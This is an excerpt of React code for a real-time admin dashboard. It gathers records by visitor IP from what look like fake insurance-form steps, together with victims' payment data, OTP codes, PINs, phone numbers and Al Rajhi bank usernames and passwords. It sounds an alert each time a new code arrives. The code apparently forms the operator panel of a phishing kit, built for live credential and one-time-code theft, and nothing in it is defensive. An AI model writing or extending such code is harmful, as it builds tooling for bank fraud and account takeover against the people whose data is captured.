...
export default function App() {
  ...
  useEffect(() => {
    ...
    socket.on("initialData", (data) => {
      ...
      ["index","vehicle","insurance","addon","summary"].forEach(key => {
        (data[key] || []).forEach(r => {
          ...
          map[r.ip] = {
            ...map[r.ip], ...r,
            payments: map[r.ip].payments,
            flag: map[r.ip].flag,
            hasNewData: false,
            hasPayment: map[r.ip].hasPayment,
            lastActivityAt: Math.max(map[r.ip].lastActivityAt || 0, r.updatedAt ? new Date(r.updatedAt).getTime() : 0),
          };
        });
      });

      (data.payment || []).forEach(p => { ensure(p.ip); map[p.ip].payments.push(p); map[p.ip].hasPayment = true; });
      (data.otp  || []).forEach(o => { ensure(o.ip); map[o.ip].latestOtp  = o.verificationCode; });
      (data.pin  || []).forEach(p => { ensure(p.ip); map[p.ip].latestPin  = p.pin; });
      (data.phone || []).forEach(p => { ensure(p.ip); map[p.ip].latestPhone = p.phoneNumber; map[p.ip].latestOperator = p.operator; });
      (data.phonecode || []).forEach(p => { ensure(p.ip); map[p.ip].latestPhoneCode = p.phoneCode; });
      (data.rajhi || []).forEach(r => { ensure(r.ip); map[r.ip].rajhiUsername = r.username; map[r.ip].rajhiPassword = r.password; });
    ...
    const mergeOtp = (o) => setUsers(m => {
      play(codeSound);
      const old = m[o.ip] || { payments:[], flag:false, hasNewData:false, hasPayment:false };
      return { ...m, [o.ip]: { ...old, latestOtp: o.verificationCode, hasNewData:true, lastActivityAt:Date.now() }};
    });

    const mergePin = (p) => setUsers(m => {
      play(codeSound);
      const old = m[p.ip] || { payments:[], flag:false, hasNewData:false, hasPayment:false };
      return { ...m, [p.ip]: { ...old, latestPin: p.pin, hasNewData:true, lastActivityAt:Date.now() }};
    });
    ...
    const mergePhoneCode = (p) => setUsers(m => {
      play(codeSound);
      const old = m[p.ip] || { payments:[], flag:false, hasNewData:false, hasPayment:false };
      return { ...m, [p.ip]: { ...old, latestPhoneCode: p.phoneCode, hasNewData:true, lastActivityAt:Date.now() }};
    });
    ...
    socket.on("flagUpdated", ({ ip, flag }) => setUsers(m => ({
    ...
    <Routes>
      ...
      <Route path="/" element={
        localStorage.getItem("token") ? (
          <DashboardView
            users={users}
            cardIp={cardIp} setCardIp={setCardIp} onShowCard={handleShowCard}
...
function DashboardView({ users, cardIp, setCardIp, onShowCard, infoIp, setInfoIp }) {
